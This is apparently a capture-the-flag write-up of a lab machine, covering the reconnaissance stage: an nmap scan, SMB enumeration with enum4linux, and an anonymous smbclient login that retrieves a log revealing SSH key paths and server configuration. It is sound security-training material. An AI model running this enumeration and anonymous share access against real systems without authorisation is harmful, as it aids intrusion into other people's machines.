# Kenobi


1. Enumerate with nmap
```
root@ip-10-10-9-47:~# sudo nmap -sS -A 10.10.210.113

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-11 00:57 BST
Nmap scan report for ip-10-10-210-113.eu-west-1.compute.internal (10.10.210.113)
Host is up (0.00085s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      44751/tcp  mountd
|   100005  1,2,3      49264/udp  mountd
|   100021  1,3,4      37667/tcp  nlockmgr
|   100021  1,3,4      54674/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:60:DD:8C:81:C5 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/11%OT=21%CT=1%CU=39111%PV=Y%DS=1%DC=D%G=Y%M=0260DD%T
OS:M=627AFC01%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=106%TI=Z%CI=I%TS=8
OS:)SEQ(SP=101%GCD=1%ISR=106%TI=Z%CI=RD%II=I%TS=8)SEQ(SP=101%GCD=1%ISR=106%
OS:TI=Z%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M
OS:2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=
OS:68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R
OS:=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-05-10T18:57:51-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-05-11 00:57:51
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms ip-10-10-210-113.eu-west-1.compute.internal (10.10.210.113)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.53 seconds
```

2. Enumerate smb with enum4linux to find user `Kenobi` and workgroup `anonymous`
```
root@ip-10-10-9-47:~# enum4linux 10.10.210.113
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 11 01:01:02 2022

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.210.113
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.10.210.113    |
 =====================================================
[+] Got domain/workgroup name: WORKGROUP

 =============================================
|    Nbtstat Information for 10.10.210.113    |
 =============================================
Looking up status of 10.10.210.113
	KENOBI          <00> -         B <ACTIVE>  Workstation Service
	KENOBI          <03> -         B <ACTIVE>  Messenger Service
	KENOBI          <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ======================================
|    Session Check on 10.10.210.113    |
 ======================================
[+] Server 10.10.210.113 allows sessions using username '', password ''

 ============================================
|    Getting domain SID for 10.10.210.113    |
 ============================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 10.10.210.113    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.10.210.113 from smbclient:
[+] Got OS info for 10.10.210.113 from srvinfo:
	KENOBI         Wk Sv PrQ Unx NT SNT kenobi server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ==============================
|    Users on 10.10.210.113    |
 ==============================
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.

Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.

 ==========================================
|    Share Enumeration on 10.10.210.113    |
 ==========================================
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            KENOBI

[+] Attempting to map shares on 10.10.210.113
//10.10.210.113/print$	Mapping: DENIED, Listing: N/A
//10.10.210.113/anonymous	Mapping: OK, Listing: OK
//10.10.210.113/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =====================================================
|    Password Policy Information for 10.10.210.113    |
 =====================================================
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ===============================
|    Groups on 10.10.210.113    |
 ===============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.10.210.113 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-55073928-793008161-2116500600
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kenobi (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-55073928-793008161-2116500600 and logon username '', password ''
S-1-5-21-55073928-793008161-2116500600-500 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-501 KENOBI\nobody (Local User)
S-1-5-21-55073928-793008161-2116500600-502 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-503 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-504 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-505 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-506 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-507 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-508 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-509 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-510 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-511 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-512 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-513 KENOBI\None (Domain Group)
S-1-5-21-55073928-793008161-2116500600-514 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-515 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-516 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-517 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-518 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-519 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-520 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-521 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-522 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-523 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-524 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-525 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-526 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-527 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-528 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-529 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-530 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-531 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-532 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-533 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-534 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-535 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-536 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-537 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-538 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-539 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-540 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-541 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-542 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-543 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-544 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-545 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-546 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-547 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-548 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-549 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-550 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1000 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1001 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1002 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1003 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1004 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1005 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1006 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1007 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1008 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1009 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1010 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1011 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1012 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1013 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1014 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1015 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1016 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1017 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1018 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1019 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1020 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1021 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1022 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1023 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1024 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1025 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1026 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1027 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1028 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1029 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1030 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1031 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1032 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1033 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1034 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1035 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1036 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1037 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1038 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1039 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1040 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1041 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1042 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1043 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1044 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1045 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1046 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1047 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1048 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1049 *unknown*\*unknown* (8)
S-1-5-21-55073928-793008161-2116500600-1050 *unknown*\*unknown* (8)

 ==============================================
|    Getting printer info for 10.10.210.113    |
 ==============================================
No printers returned.


enum4linux complete on Wed May 11 01:01:20 2022
```

3. Login to smb with `smbclient \\\\<ip address>\\anonymous`, use `ls` to show files, and use `get log.txt` to download the file
```
root@ip-10-10-9-47:~# cat log.txt
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21

# Don't use IPv6 support by default.
UseIPv6				off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask				022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances			30

# Set the user and group under which the server will run.
User				kenobi
Group				kenobi

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite		on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User				ftp
  Group				ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias			anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients			10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  DisplayLogin			welcome.msg
  DisplayChdir			.message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    DenyAll
  </Limit>
</Anonymous>
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which
# are not shown in this example
#
# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic
# errors.

#======================= Global Settings =======================

[global]

## Browsing/Identification ###

# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP

# server string is the equivalent of the NT Description field
	server string = %h server (Samba, Ubuntu)

# Windows Internet Name Serving Support Section:
# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
#   wins support = no

# WINS Server - Tells the NMBD components of Samba to be a WINS Client
# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
;   wins server = w.x.y.z

# This will prevent nmbd to search for NetBIOS names through DNS.
   dns proxy = no

#### Networking ####

# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 eth0

# Only bind to the named interfaces and/or networks; you must use the
# 'interfaces' option above to use this.
# It is recommended that you enable this feature if your Samba machine is
# not protected by a firewall or is a firewall itself.  However, this
# option cannot handle dynamic or non-broadcast interfaces correctly.
;   bind interfaces only = yes



#### Debugging/Accounting ####

# This tells Samba to use a separate log file for each machine
# that connects
   log file = /var/log/samba/log.%m

# Cap the size of the individual log files (in KiB).
   max log size = 1000

# If you want Samba to only log through syslog then set the following
# parameter to 'yes'.
#   syslog only = no

# We want Samba to log a minimum amount of information to syslog. Everything
# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
# through syslog you should set the following parameter to something higher.
   syslog = 0

# Do something sensible when Samba crashes: mail the admin a backtrace
   panic action = /usr/share/samba/panic-action %d


####### Authentication #######

# Server role. Defines in which mode Samba will operate. Possible
# values are "standalone server", "member server", "classic primary
# domain controller", "classic backup domain controller", "active
# directory domain controller".
#
# Most people will want "standalone sever" or "member server".
# Running as "active directory domain controller" will require first
# running "samba-tool domain provision" to wipe databases and create a
# new domain.
   server role = standalone server

# If you are using encrypted passwords, Samba will need to know what
# password database type you are using.
   passdb backend = tdbsam

   obey pam restrictions = yes

# This boolean parameter controls whether Samba attempts to sync the Unix
# password with the SMB password when the encrypted SMB password in the
# passdb is changed.
   unix password sync = yes

# For Unix password sync to work on a Debian GNU/Linux system, the following
# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
# sending the correct chat script for the passwd program in Debian Sarge).
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

# This boolean controls whether PAM will be used for password changes
# when requested by an SMB client instead of the program listed in
# 'passwd program'. The default is 'no'.
   pam password change = yes

# This option controls how unsuccessful authentication attempts are mapped
# to anonymous connections
   map to guest = bad user

########## Domains ###########

#
# The following settings only takes effect if 'server role = primary
# classic domain controller', 'server role = backup domain controller'
# or 'domain logons' is set
#

# It specifies the location of the user's
# profile directory from the client point of view) The following
# required a [profiles] share to be setup on the samba server (see
# below)
;   logon path = \\%N\profiles\%U
# Another common choice is storing the profile in the user's home directory
# (this is Samba's default)
#   logon path = \\%N\%U\profile

# The following setting only takes effect if 'domain logons' is set
# It specifies the location of a user's home directory (from the client
# point of view)
;   logon drive = H:
#   logon home = \\%N\%U

# The following setting only takes effect if 'domain logons' is set
# It specifies the script to run during logon. The script must be stored
# in the [netlogon] share
# NOTE: Must be store in 'DOS' file format convention
;   logon script = logon.cmd

# This allows Unix users to be created on the domain controller via the SAMR
# RPC pipe.  The example command creates a user account with a disabled Unix
# password; please adapt to your needs
; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u

# This allows machine accounts to be created on the domain controller via the
# SAMR RPC pipe.
# The following assumes a "machines" group exists on the system
; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u

# This allows Unix groups to be created on the domain controller via the SAMR
# RPC pipe.
; add group script = /usr/sbin/addgroup --force-badname %g

############ Misc ############

# Using the following line enables you to customise your configuration
# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting
;   include = /home/samba/etc/smb.conf.%m

# Some defaults for winbind (make sure you're not using the ranges
# for something else.)
;   idmap uid = 10000-20000
;   idmap gid = 10000-20000
;   template shell = /bin/bash

# Setup usershare options to enable non-root users to share folders
# with the net usershare command.

# Maximum number of usershare. 0 (default) means that usershare is disabled.
;   usershare max shares = 100

# Allow users who've been granted usershare privileges to create
# public shares, not just authenticated ones
   usershare allow guests = yes

#======================= Share Definitions =======================

# Un-comment the following (and tweak the other settings below to suit)
# to enable the default home directory shares. This will share each
# user's home directory as \\server\username
;[homes]
;   comment = Home Directories
;   browseable = no

# By default, the home directories are exported read-only. Change the
# next parameter to 'no' if you want to be able to write to them.
;   read only = yes

# File creation mask is set to 0700 for security reasons. If you want to
# create files with group=rw permissions, set next parameter to 0775.
;   create mask = 0700

# Directory creation mask is set to 0700 for security reasons. If you want to
# create dirs. with group=rw permissions, set next parameter to 0775.
;   directory mask = 0700

# By default, \\server\username shares can be connected to by anyone
# with access to the samba server.
# Un-comment the following parameter to make sure that only "username"
# can connect to \\server\username
# This might need tweaking when using external authentication schemes
;   valid users = %S

# Un-comment the following and create the netlogon directory for Domain Logons
# (you need to configure Samba to act as a domain controller too.)
;[netlogon]
;   comment = Network Logon Service
;   path = /home/samba/netlogon
